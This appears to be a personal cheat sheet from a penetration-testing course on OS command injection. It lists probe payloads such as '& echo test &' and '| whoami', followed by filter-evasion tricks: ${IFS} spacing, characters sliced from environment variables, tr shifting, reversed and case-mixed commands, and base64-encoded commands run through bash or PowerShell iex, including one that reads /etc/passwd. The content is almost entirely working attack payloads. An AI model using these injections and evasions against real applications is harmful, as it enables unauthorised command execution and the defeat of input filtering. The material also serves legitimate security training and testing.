#### Checking for OS Escapes
```txt
& echo test &
| whoami

```



##### Bypassing Character Filters
```CLI
{ls,-la}   #brackets add spaces and wrap brackets
${IFS}    #Space and tab

# Use evnironmet variables to get a character.   use printenv to get all environments
${PATH:0:1}    #this will get you a /
${LS_COLORS:10:1}    # this will give you a ;

#Windows version
%HOMEPATH:~6,-11%
$env:HOMEPATH[0]        #PowerShell

#Shifting ascii characters
echo $(tr '!-}' '"-~'<<<[)       # This takes ascii 91 which is [  and adds 1 to print \



#Convert all cases in a string to pass it, ex. from Upper to lowercase in Linux
$(tr "A-Z" "a-z" <<< "WhOAMi"
$(a="WhOaMi";printf %s "${a,,}")


#reverse the commands   in cli you can run command to reverse it for you   $ echo ‘whoami’ | rev   
$(rev<<<'imaohw')

	# In Windows   PS C:\htb> "whoami"[-1..-20] -join ''
	PS C:\htb> iex "$('imaohw'[-1..-20] -join '')"
	
	
#Advance obfuscation, first convert it to some encoded string like base64 or hex, then create the command that will decode it
echo -n 'cat /etc/passwd | grep 33' | base64
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)

#FOR WINDOWS
PS C:\htb> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
# If needed to encode to base64 on linux to pass in windows, need to convert from utf-8 to utf-16
echo -n whoami | iconv -f utf-8 -t utf-16le | base64
PS C:\htb> iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```
